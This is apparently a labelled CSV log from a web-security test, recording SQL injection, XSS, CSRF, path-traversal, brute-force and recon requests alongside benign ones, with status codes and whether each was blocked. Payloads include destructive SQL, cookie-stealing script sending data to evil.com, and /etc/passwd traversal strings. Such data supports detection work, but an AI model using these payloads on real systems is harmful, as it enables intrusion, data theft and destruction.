timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-07-04T13:52:10.812540,sqli,' AND 1=1--,1,401,False
2026-07-04T13:52:11.010386,sqli,1' OR '1'='1' /*,1,401,False
2026-07-04T13:52:11.437759,sqli,' AND 1=1--,1,404,False
2026-07-04T13:52:11.845506,sqli,1' OR '1'='1' /*,1,401,False
2026-07-04T13:52:12.178769,sqli,'; WAITFOR DELAY '00:00:05'--,1,401,False
2026-07-04T13:52:12.465106,sqli,'; DELETE FROM products WHERE 1=1--,1,401,False
2026-07-04T13:52:12.867232,sqli,'; DELETE FROM products WHERE 1=1--,1,401,False
2026-07-04T13:52:13.194384,sqli,'; DROP TABLE users--,1,401,False
2026-07-04T13:52:13.420526,sqli,admin'--,1,401,False
2026-07-04T13:52:13.784489,sqli,' OR '1'='1,1,401,False
2026-07-04T13:52:14.077882,sqli,admin'--,1,401,False
2026-07-04T13:52:14.236481,sqli,"' UNION SELECT NULL,NULL,NULL--",1,401,False
2026-07-04T13:52:14.844096,sqli,' AND SLEEP(5)--,1,401,False
2026-07-04T13:52:15.033477,sqli,' OR 1=1--,1,401,False
2026-07-04T13:52:15.394792,sqli,' OR 1=1--,1,401,False
2026-07-04T13:52:15.781463,benign,normal_request,0,200,False
2026-07-04T13:52:16.221362,benign,normal_request,0,401,False
2026-07-04T13:52:17.015350,benign,normal_request,0,401,False
2026-07-04T13:52:17.522536,benign,normal_request,0,401,False
2026-07-04T13:52:18.030191,benign,normal_request,0,200,False
2026-07-04T13:52:18.808725,benign,normal_request,0,401,False
2026-07-04T13:52:19.416712,benign,normal_request,0,401,False
2026-07-04T13:52:20.130026,benign,normal_request,0,201,False
2026-07-04T13:52:20.804801,benign,normal_request,0,200,False
2026-07-04T13:52:21.405287,benign,normal_request,0,401,False
2026-07-04T13:52:21.797502,xss,<iframe src='javascript:alert(1)'>,1,201,False
2026-07-04T13:52:22.049112,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,201,False
2026-07-04T13:52:22.293278,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,201,False
2026-07-04T13:52:22.584982,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-07-04T13:52:22.837266,xss,<body onload=alert(1)>,1,201,False
2026-07-04T13:52:23.108310,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,201,False
2026-07-04T13:52:23.273837,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-07-04T13:52:23.488372,xss,<body onload=alert(1)>,1,201,False
2026-07-04T13:52:23.807979,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-07-04T13:52:23.972441,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,201,False
2026-07-04T13:52:24.214873,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-07-04T13:52:24.421680,xss,<body onload=alert(1)>,1,201,False
2026-07-04T13:52:24.553583,benign,normal_request,0,200,False
2026-07-04T13:52:25.096359,benign,normal_request,0,401,False
2026-07-04T13:52:25.491523,benign,normal_request,0,401,False
2026-07-04T13:52:26.306009,benign,normal_request,0,201,False
2026-07-04T13:52:26.836020,benign,normal_request,0,401,False
2026-07-04T13:52:27.600556,benign,normal_request,0,201,False
2026-07-04T13:52:27.895883,benign,normal_request,0,401,False
2026-07-04T13:52:28.211127,benign,normal_request,0,401,False
2026-07-04T13:52:28.478676,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,201,False
2026-07-04T13:52:29.003810,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,201,False
2026-07-04T13:52:29.345145,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
2026-07-04T13:52:29.732097,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-07-04T13:52:30.088050,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-07-04T13:52:30.556260,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
2026-07-04T13:52:30.859472,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
2026-07-04T13:52:31.278875,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,201,False
2026-07-04T13:52:31.710128,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
2026-07-04T13:52:32.052698,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
2026-07-04T13:52:32.271454,benign,normal_request,0,401,False
2026-07-04T13:52:32.746054,benign,normal_request,0,401,False
2026-07-04T13:52:33.452424,benign,normal_request,0,201,False
2026-07-04T13:52:33.792986,benign,normal_request,0,200,False
2026-07-04T13:52:34.543385,benign,normal_request,0,200,False
2026-07-04T13:52:35.183211,benign,normal_request,0,201,False
2026-07-04T13:52:38.932951,path_traversal,../../../etc/passwd,1,403,True
2026-07-04T13:52:39.115828,path_traversal,../../../etc/passwd,1,405,False
2026-07-04T13:52:43.486651,path_traversal,....//....//....//etc/passwd,1,403,True
2026-07-04T13:52:43.788935,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,405,False
2026-07-04T13:52:46.842733,path_traversal,../../../etc/passwd,1,403,True
2026-07-04T13:52:46.970657,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-04T13:52:47.349654,path_traversal,/var/www/../../etc/passwd,1,405,False
2026-07-04T13:52:47.694846,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-04T13:52:48.041679,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-04T13:52:48.465444,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-04T13:52:48.793297,benign,normal_request,0,201,False
2026-07-04T13:52:49.141307,benign,normal_request,0,200,False
2026-07-04T13:52:49.795361,benign,normal_request,0,401,False
2026-07-04T13:52:50.238059,benign,normal_request,0,201,False
2026-07-04T13:52:50.791013,benign,normal_request,0,401,False
2026-07-04T13:52:51.050144,benign,normal_request,0,401,False
2026-07-04T13:52:51.560122,benign,normal_request,0,401,False
2026-07-04T13:52:52.250982,benign,normal_request,0,401,False
2026-07-04T13:52:52.809008,brute_force,user:Admin@123,1,404,False
2026-07-04T13:52:53.041400,brute_force,root:admin123,1,404,False
2026-07-04T13:52:53.249943,brute_force,root:letmein,1,404,False
2026-07-04T13:52:53.453278,brute_force,user:password,1,404,False
2026-07-04T13:52:53.631456,brute_force,test:admin123,1,404,False
2026-07-04T13:52:53.737946,brute_force,admin:Admin@123,1,404,False
2026-07-04T13:52:53.984435,brute_force,root:admin123,1,404,False
2026-07-04T13:52:54.189015,brute_force,administrator:admin123,1,404,False
2026-07-04T13:52:54.363981,brute_force,admin:admin123,1,404,False
2026-07-04T13:52:54.500941,brute_force,test:admin123,1,404,False
2026-07-04T13:52:54.677141,brute_force,administrator:letmein,1,404,False
2026-07-04T13:52:54.862568,brute_force,administrator:123456,1,404,False
2026-07-04T13:52:55.069108,brute_force,test:admin123,1,404,False
2026-07-04T13:52:55.319633,brute_force,user:letmein,1,404,False
2026-07-04T13:52:55.493827,brute_force,root:password,1,404,False
2026-07-04T13:52:55.710257,brute_force,test:123456,1,404,False
2026-07-04T13:52:55.893806,brute_force,test:letmein,1,404,False
2026-07-04T13:52:56.046056,brute_force,test:password,1,404,False
2026-07-04T13:52:56.263351,brute_force,admin:admin123,1,404,False
2026-07-04T13:52:56.441501,brute_force,root:letmein,1,404,False
2026-07-04T13:52:56.569752,brute_force,root:password,1,404,False
2026-07-04T13:52:56.770002,brute_force,user:123456,1,404,False
2026-07-04T13:52:57.012920,brute_force,administrator:letmein,1,404,False
2026-07-04T13:52:57.218775,brute_force,user:password,1,404,False
2026-07-04T13:52:57.317805,brute_force,admin:123456,1,404,False
2026-07-04T13:52:57.463151,benign,normal_request,0,201,False
2026-07-04T13:52:58.101846,benign,normal_request,0,401,False
2026-07-04T13:52:58.716883,benign,normal_request,0,401,False
2026-07-04T13:52:59.282041,benign,normal_request,0,201,False
2026-07-04T13:52:59.591090,benign,normal_request,0,201,False
2026-07-04T13:53:00.213641,benign,normal_request,0,401,False
2026-07-04T13:53:00.865401,benign,normal_request,0,401,False
2026-07-04T13:53:01.461509,benign,normal_request,0,201,False
2026-07-04T13:53:02.196027,benign,normal_request,0,401,False
2026-07-04T13:53:02.642991,benign,normal_request,0,201,False
2026-07-04T13:53:07.797536,recon,/phpmyadmin,1,403,True
2026-07-04T13:53:12.950413,recon,/data/users.json,1,N/A,False
2026-07-04T13:53:13.249270,recon,/admin,1,404,True
2026-07-04T13:53:13.395958,recon,/server-status,1,404,True
